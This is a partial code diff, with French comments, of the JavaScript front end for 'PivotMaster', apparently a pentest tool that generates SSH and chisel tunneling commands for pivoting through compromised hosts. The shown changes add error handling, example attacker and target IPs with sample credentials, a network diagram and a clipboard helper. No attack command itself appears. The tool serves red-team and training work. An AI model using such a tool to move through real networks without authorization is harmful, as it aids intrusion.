-        document.getElementById('target1IP').value = '192.168.1.100';
-        document.getElementById('target1User').value = 'www-data';
-        document.getElementById('target1OS').value = 'linux';
-        document.getElementById('target1Services').value = '22,80,443';
-        
-        document.getElementById('target2IP').value = '10.10.10.50';
-        document.getElementById('target2Port').value = '22';
-        document.getElementById('target2OS').value = 'linux';
-        
-        document.getElementById('doublePivot').checked = true;
-        this.toggleDoublePivot();
-        
-        document.getElementById('target3IP').value = '172.16.1.50';
-        document.getElementById('target3Port').value = '3389';
-        
+        try {
+            // Charger les valeurs d'exemple
+            const elements = {
+                attackerIp: document.getElementById('attackerIp'),
+                attackerPort: document.getElementById('attackerPort'),
+                target1Ip: document.getElementById('target1Ip'),
+                target1Port: document.getElementById('target1Port'),
+                target1User: document.getElementById('target1User'),
+                target1Password: document.getElementById('target1Password'),
+                target2Ip: document.getElementById('target2Ip'),
+                target2Port: document.getElementById('target2Port'),
+                target2User: document.getElementById('target2User'),
+                target2Password: document.getElementById('target2Password'),
+                doublePivot: document.getElementById('doublePivot')
+            };
+
+            // Vérifier si tous les éléments existent
+            for (const [key, element] of Object.entries(elements)) {
+                if (!element) {
+                    console.error(`Élément manquant: ${key}`);
+                    this.showNotification(`Erreur: Élément ${key} non trouvé`, 'error');
+                    return;
+                }
+            }
+
+            // Définir les valeurs d'exemple
+            elements.attackerIp.value = '10.10.14.15';
+            elements.attackerPort.value = '4444';
+            elements.target1Ip.value = '192.168.1.100';
+            elements.target1Port.value = '22';
+            elements.target1User.value = 'user';
+            elements.target1Password.value = 'password123';
+            elements.target2Ip.value = '172.16.1.100';
+            elements.target2Port.value = '3389';
+            elements.target2User.value = 'admin';
+            elements.target2Password.value = 'admin123';
+            elements.doublePivot.checked = true;
+
+            // Sélectionner quelques outils par défaut
+            const toolCheckboxes = document.querySelectorAll('input[name="tools"]');
+            toolCheckboxes.forEach(checkbox => {
+                if (['ssh', 'chisel'].includes(checkbox.value)) {
+                    checkbox.checked = true;
+                } else {
+                    checkbox.checked = false;
+                }
+            });
+
+            // Sauvegarder la configuration
         this.saveConfig();
-        this.showNotification('Exemple chargé !', 'info');
+
+            // Mettre à jour l'interface
+            this.toggleDoublePivot();
+            this.updateNetworkVisualization();
+
+            this.showNotification('Exemple chargé avec succès', 'success');
+        } catch (error) {
+            console.error('Erreur lors du chargement de l\'exemple:', error);
+            this.showNotification('Erreur lors du chargement de l\'exemple', 'error');
+        }
     }
 
     /**
@@ -1374,35 +1388,185 @@ class PivotMaster {
     }
 
     updateNetworkVisualization() {
-        if (this.networkVisualizer) {
-            this.networkVisualizer.updateNetworkFromConfig();
+        try {
+            const config = {
+                attacker: {
+                    ip: document.getElementById('attackerIp')?.value || '',
+                    port: document.getElementById('attackerPort')?.value || ''
+                },
+                target1: {
+                    ip: document.getElementById('target1Ip')?.value || '',
+                    port: document.getElementById('target1Port')?.value || '',
+                    user: document.getElementById('target1User')?.value || '',
+                    password: document.getElementById('target1Password')?.value || ''
+                },
+                target2: {
+                    ip: document.getElementById('target2Ip')?.value || '',
+                    port: document.getElementById('target2Port')?.value || '',
+                    user: document.getElementById('target2User')?.value || '',
+                    password: document.getElementById('target2Password')?.value || ''
+                },
+                doublePivot: document.getElementById('doublePivot')?.checked || false
+            };
+
+            // Créer les nœuds
+            const nodes = new vis.DataSet([
+                {
+                    id: 1,
+                    label: `Attaquant\n${config.attacker.ip}`,
+                    group: 'attacker',
+                    title: 'Machine Attaquante'
+                },
+                {
+                    id: 2,
+                    label: `Target 1\n${config.target1.ip}`,
+                    group: 'target1',
+                    title: 'Premier Pivot'
+                }
+            ]);
+
+            // Créer les arêtes
+            const edges = new vis.DataSet([
+                {
+                    from: 1,
+                    to: 2,
+                    arrows: 'to',
+                    label: 'Tunnel'
+                }
+            ]);
+
+            // Ajouter Target 2 si double pivot est activé
+            if (config.doublePivot && config.target2.ip) {
+                nodes.add({
+                    id: 3,
+                    label: `Target 2\n${config.target2.ip}`,
+                    group: 'target2',
+                    title: 'Second Pivot'
+                });
+                edges.add({
+                    from: 2,
+                    to: 3,
+                    arrows: 'to',
+                    label: 'Tunnel'
+                });
+            }
+
+            // Configuration du réseau
+            const options = {
+                nodes: {
+                    shape: 'dot',
+                    size: 20,
+                    font: {
+                        size: 14
+                    }
+                },
+                edges: {
+                    font: {
+                        size: 12
+                    }
+                },
+                groups: {
+                    attacker: {
+                        color: { background: '#ff4444', border: '#cc0000' }
+                    },
+                    target1: {
+                        color: { background: '#44ff44', border: '#00cc00' }
+                    },
+                    target2: {
+                        color: { background: '#4444ff', border: '#0000cc' }
+                    }
+                },
+                physics: {
+                    stabilization: true,
+                    barnesHut: {
+                        gravitationalConstant: -2000,
+                        springConstant: 0.04,
+                        springLength: 200
+                    }
+                }
+            };
+
+            // Créer ou mettre à jour le réseau
+            const container = document.getElementById('network');
+            if (container) {
+                if (this.network) {
+                    this.network.setData({ nodes, edges });
+                } else {
+                    this.network = new vis.Network(container, { nodes, edges }, options);
+                }
+            }
+        } catch (error) {
+            console.error('Erreur lors de la mise à jour de la visualisation réseau:', error);
+        }
+    }
+
+    // Fonction pour copier le texte dans le presse-papiers
+    copyToClipboard(button) {
+        try {
+            const commandBlock = button.closest('.command-block');
+            const codeElement = commandBlock.querySelector('code');
+            const textToCopy = codeElement.textContent;
+
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                // Changer temporairement l'icône pour indiquer le succès
+                const icon = button.querySelector('i');
+                const originalClass = icon.className;
+                icon.className = 'fas fa-check';
+                
+                // Restaurer l'icône originale après 2 secondes
+                setTimeout(() => {
+                    icon.className = originalClass;
+                }, 2000);
+
+                this.showNotification('Commande copiée dans le presse-papiers', 'success');
+            }).catch(err => {
+                console.error('Erreur lors de la copie:', err);
+                this.showNotification('Erreur lors de la copie de la commande', 'error');
+            });
+        } catch (error) {
+            console.error('Erreur lors de la copie:', error);
+            this.showNotification('Erreur lors de la copie de la commande', 'error');
         }
     }
 }
 
-// Fonctions globales pour les boutons
+// Fonctions globales pour les événements HTML
 function generateCommands() { 
-    pivotMaster.generateCommands(); 
+    if (window.pivotMaster) {
+        window.pivotMaster.generateCommands();
+    } else {
+        console.error('PivotMaster n\'est pas initialisé');
+    }
 }
 
 function clearForm() { 
-    pivotMaster.clearForm(); 
+    if (window.pivotMaster) {
+        window.pivotMaster.clearForm();
+    }
 }
 
 function loadExample() { 
-    pivotMaster.loadExample(); 
+    if (window.pivotMaster) {
+        window.pivotMaster.loadExample();
+    }
 }
 
 function copyAllCommands() { 
-    pivotMaster.copyAllCommands(); 
+    if (window.pivotMaster) {
+        window.pivotMaster.copyAllCommands();
+    }
 }
 
 function exportScript() { 
-    pivotMaster.exportScript(); 
+    if (window.pivotMaster) {
+        window.pivotMaster.exportScript();
+    }
 }
 
 function exportCheatsheet() { 
-    pivotMaster.exportCheatsheet(); 
+    if (window.pivotMaster) {
+        window.pivotMaster.exportCheatsheet();
+    }
 }
 
 // Fonctions globales pour la visualisation réseau
@@ -1430,10 +1594,13 @@ function toggleNetworkPhysics() {
     }
 }
 
-// Initialisation globale
-let pivotMaster;
-
+// Initialisation de l'application
 document.addEventListener('DOMContentLoaded', async () => {
-    pivotMaster = new PivotMaster();
-    await pivotMaster.init();
+    try {
+        window.pivotMaster = new PivotMaster();
+        await window.pivotMaster.init();
+        console.log('PivotMaster initialisé avec succès');
+    } catch (error) {
+        console.error('Erreur lors de l\'initialisation de PivotMaster:', error);
+    }
 }); 
